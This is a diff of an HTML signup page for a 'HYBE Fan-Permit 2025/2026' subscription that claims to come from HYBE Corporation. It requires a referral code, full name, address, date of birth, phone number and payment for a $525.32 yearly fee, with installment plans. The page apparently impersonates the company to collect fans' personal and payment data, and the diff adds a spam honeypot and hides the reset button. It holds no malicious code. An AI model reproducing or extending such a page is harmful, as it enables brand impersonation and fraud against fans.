@@ -7,34 +7,25 @@
   <meta name="description" content="Join the HYBE Fan-Permit 2025/2026 for exclusive K-pop access, artist content, events, and limited-edition merchandise. Secure your spot today!" />
   <meta name="keywords" content="HYBE, K-pop, fan subscription, fan permit, HYBE artists, HYBE membership, K-pop merchandise" />
   <meta name="author" content="HYBE Corporation" />
-  <!-- Open Graph / Facebook -->
   <meta property="og:type" content="website" />
   <meta property="og:url" content="hybecorp.com" />
   <meta property="og:title" content="Official HYBE Fan-Permit 2025/2026 Subscription" />
   <meta property="og:description" content="Get exclusive access to HYBE artist events, behind-the-scenes content, and official merchandise." />
   <meta property="og:image" content="https://logotyp.us/file/hybe.svg" />
-  <!-- Twitter -->
   <meta name="twitter:card" content="summary_large_image" />
   <meta name="twitter:url" content="hybecorp.com" />
   <meta name="twitter:title" content="Join HYBE Fan-Permit 2025/2026" />
   <meta name="twitter:description" content="Be first in line for artist events, fan meetings, and official HYBE gear." />
   <meta name="twitter:image" content="https://logotyp.us/file/hybe.svg" />
-  <!-- Bootstrap 5 CSS -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
-  <!-- AOS CSS -->
   <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet" />
-  <!-- Bootstrap Icons -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet" />
-  <!-- Intl-tel-input CSS -->
   <link href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/css/intlTelInput.css" rel="stylesheet" />
-  <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet" />
-  <!-- Custom CSS -->
   <link rel="stylesheet" href="styles.css" />
   <script type="module" src="script.js"></script>
 </head>
 <body>
-  <!-- No JavaScript Fallback -->
   <noscript>
     <div class="container my-5 text-center">
       <h2>JavaScript Required</h2>
@@ -42,7 +33,6 @@
     </div>
   </noscript>
 
-  <!-- Onboarding Intro Section as Pop-Up Modal -->
   <div class="modal fade" id="onboardingModal" tabindex="-1" aria-labelledby="onboardingModalLabel" aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
       <div class="modal-content hero">
@@ -61,7 +51,6 @@
         <div class="col-lg-8 col-md-10">
           <div class="card shadow-lg" data-aos="zoom-in">
             <div class="card-body">
-              <!-- Progress Bar -->
               <div class="progress mb-4" role="progressbar" aria-label="Form completion progress" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100">
                 <div class="progress-bar bg-gradient" style="width: 0%"></div>
               </div>
@@ -74,15 +63,15 @@
               <h2 class="text-center text-muted mb-3">Join the Ultimate Fan Community</h2>
               <p class="text-center description mb-4">Subscribe for exclusive access to HYBE artist updates, events, and merchandise.</p>
 
-              <form id="subscription-form" name="subscription-form" data-netlify="true" method="POST" action="/submit-fan-permit">
+              <form id="subscription-form" name="subscription-form" data-netlify="true" data-netlify-honeypot="bot-field" method="POST" action="/submit-fan-permit">
                 <input type="hidden" name="form-name" value="subscription-form" />
+                <p class="d-none"><label>Don’t fill this out: <input name="bot-field" /></label></p>
                 <input type="hidden" name="country" id="country" />
                 <input type="hidden" name="currency" id="currency" />
                 <input type="hidden" name="language" id="language" />
                 <input type="hidden" name="permit-id" id="permit-id" />
                 <input type="hidden" name="submission-id" id="submission-id" />
 
-                <!-- Referral Code -->
                 <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="10">
                   <label for="referral-code" class="form-label">Referral Code <span class="text-danger">*</span></label>
                   <input type="text" class="form-control" id="referral-code" name="referral-code" placeholder="Enter referral code" required aria-required="true" aria-describedby="referral-code-error" />
@@ -90,7 +79,6 @@
                   <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Enter your exclusive referral code"></i>
                 </div>
 
-                <!-- Full Name -->
                 <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="25">
                   <label for="full-name" class="form-label">Full Name <span class="text-danger">*</span></label>
                   <input type="text" class="form-control" id="full-name" name="full-name" required aria-required="true" aria-describedby="full-name-error" />
@@ -98,7 +86,6 @@
                   <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Enter your full legal name"></i>
                 </div>
 
-                <!-- Email -->
                 <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="50">
                   <label for="email" class="form-label">Email <span class="text-danger">*</span></label>
                   <input type="email" class="form-control" id="email" name="email" required aria-required="true" aria-describedby="email-error" />
@@ -107,7 +94,6 @@
                   <p class="text-muted small">A verification email will be sent to confirm your email address.</p>
                 </div>
 
-                <!-- Phone Number -->
                 <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="75">
                   <label for="phone" class="form-label">Phone Number <span class="text-danger">*</span></label>
                   <input type="tel" class="form-control" id="phone" name="phone" placeholder="Enter phone number" required aria-required="true" aria-describedby="phone-error" />
@@ -115,7 +101,6 @@
                   <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Include country code"></i>
                 </div>
 
-                <!-- Address -->
                 <div class="mb-3" data-aos="fade-up" data-aos-delay="100" id="address-section">
                   <label class="form-label">Address <span class="text-danger">*</span></label>
                   <div id="address-fields">
@@ -133,7 +118,6 @@
                   </div>
                 </div>
 
-                <!-- Date of Birth -->
                 <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="125">
                   <label for="dob" class="form-label">Date of Birth <span class="text-danger">*</span></label>
                   <input type="date" class="form-control" id="dob" name="dob" required aria-required="true" placeholder="YYYY-MM-DD" aria-describedby="dob-error" />
@@ -141,7 +125,6 @@
                   <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Enter your birth date"></i>
                 </div>
 
-                <!-- Gender -->
                 <div class="mb-3" data-aos="fade-up" data-aos-delay="150">
                   <label for="gender" class="form-label">Gender <span class="text-danger">*</span></label>
                   <select class="form-select" id="gender" name="gender" required aria-required="true" aria-describedby="gender-error">
@@ -154,7 +137,6 @@
                   <div id="gender-error" class="invalid-feedback"></div>
                 </div>
 
-                <!-- Fan-To-Artist Preferences -->
                 <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="200">
                   <label for="branch" class="form-label">Fan-To-Artist Preferences <span class="text-danger">*</span></label>
                   <select class="form-select" id="branch" name="branch" required aria-required="true" aria-describedby="branch-error">
@@ -182,7 +164,6 @@
                   <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Pick your favorite artist"></i>
                 </div>
 
-                <!-- Why Subscribe -->
                 <div class="mb-3" data-aos="fade-up" data-aos-delay="325">
                   <h3 class="h5">Why Subscribe to the HYBE Fan-Permit?</h3>
                   <p class="text-muted mb-2">The HYBE Fan-Permit connects fans and artists in a secure, private environment, ensuring authentic interactions while prioritizing privacy and online safety.</p>
@@ -195,7 +176,6 @@
                   </ul>
                 </div>
 
-                <!-- Subscription Amount -->
                 <div class="mb-3 subscription-amount" data-aos="fade-up" data-aos-delay="350">
                   <label class="form-label">Subscription Amount</label>
                   <p class="form-control-plaintext fw-bold text-primary" style="font-size: 1.5rem; background: linear-gradient(90deg, #8e44ad, #3498db); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
@@ -204,7 +184,6 @@
                   <input type="hidden" name="amount" value="$525.32/year" />
                 </div>
 
-                <!-- Payment Type -->
                 <div class="mb-3 position-relative" data-aos="fade-up" data-aos-delay="400">
                   <label for="payment-type" class="form-label">Select Payment Type <span class="text-danger">*</span></label>
                   <select class="form-select" id="payment-type" name="payment-type" required aria-required="true" aria-describedby="payment-type-error">
@@ -216,10 +195,9 @@
                   <i class="bi bi-info-circle tooltip-icon" data-bs-toggle="tooltip" data-bs-title="Choose payment method"></i>
                 </div>
 
-                <!-- Installment Options -->
                 <div class="mb-3 d-none" id="installment-options" data-aos="fade-up" data-aos-delay="450">
                   <label for="installment-plan" class="form-label">Installment Plan <span class="text-danger">*</span></label>
-                  <select class="form-select" id="installment-plan" name="installment-plan" aria-describedby="installment-plan-error">
+                  <select class="form-select" id="install wallet-plan" name="installment-plan" aria-describedby="installment-plan-error">
                     <option value="" disabled selected>Select Installment Plan</option>
                     <option value="2-installment">2 Installments ($260 x 2)</option>
                     <option value="3-installment">3 Installments ($173.33 x 3)</option>
@@ -228,7 +206,6 @@
                   <p class="mt-2 text-muted">Installments must be completed within the subscription year.</p>
                 </div>
 
-                <!-- Payment Methods -->
                 <div class="mb-3 d-none" id="payment-methods" data-aos="fade-up" data-aos-delay="500">
                   <label class="form-label">Payment Methods <span class="text-danger">*</span></label>
                   <div class="form-check">
@@ -246,7 +223,6 @@
                   <div id="payment-method-error" class="invalid-feedback"></div>
                 </div>
 
-                <!-- Contact Method -->
                 <div class="mb-3" data-aos="fade-up" data-aos-delay="600">
                   <label class="form-label">Preferred Contact Method <span class="text-danger">*</span></label>
                   <div class="form-check">
@@ -260,17 +236,15 @@
                   <div id="contact-method-error" class="invalid-feedback"></div>
                 </div>
 
-                <!-- Feedback -->
                 <div class="mb-3" data-aos="fade-up" data-aos-delay="650">
                   <label for="feedback" class="form-label">Feedback (Optional)</label>
                   <textarea class="form-control" id="feedback" name="feedback" placeholder="Share your thoughts about the Fan-Permit"></textarea>
                 </div>
 
-                <!-- Agreements -->
                 <div class="mb-3" data-aos="fade-up" data-aos-delay="700">
                   <div class="form-check">
                     <input class="form-check-input" type="checkbox" id="installment-terms" name="installment-terms" />
-                    <label class="form-check-label" for="installment-terms">Agree to installment terms.</label>
+                    <label class="form-check-label" for="installment-terms"> Agree to installment terms.</label>
                   </div>
                   <div class="form-check">
                     <input class="form-check-input" type="checkbox" id="privacy-policy" name="privacy-policy" required aria-describedby="privacy-policy-error" />
@@ -284,14 +258,12 @@
                   </div>
                 </div>
 
-                <!-- Submit Button -->
                 <button type="submit" class="btn btn-primary w-100 btn-gradient" data-aos="fade-up" data-aos-delay="750" id="submit-btn">
                   <span class="btn-text">Submit Subscription</span>
                   <span class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
                 </button>
 
-                <!-- Reset Button -->
-                <button type="button" class="btn btn-secondary w-100 mt-2" id="reset-btn" data-aos="fade-up" data-aos-delay="800">Reset Form</button>
+                <button type="button" class="btn btn-secondary w-100 mt-2 d-none" id="reset-btn" data-aos="fade-up" data-aos-delay="800">Reset Form</button>
               </form>
 
               <p id="form-message" class="mt-3 text-center alert alert-dismissible fade show d-none" role="alert" aria-live="assertive"></p>
@@ -301,7 +273,6 @@
       </div>
     </div>
 
-    <!-- Validation Countdown Modal -->
     <div class="modal fade" id="validationModal" tabindex="-1" aria-labelledby="validationModalLabel" aria-describedby="validationModalDesc" aria-hidden="true">
       <div class="modal-dialog modal-dialog-centered">
         <div class="modal-content">
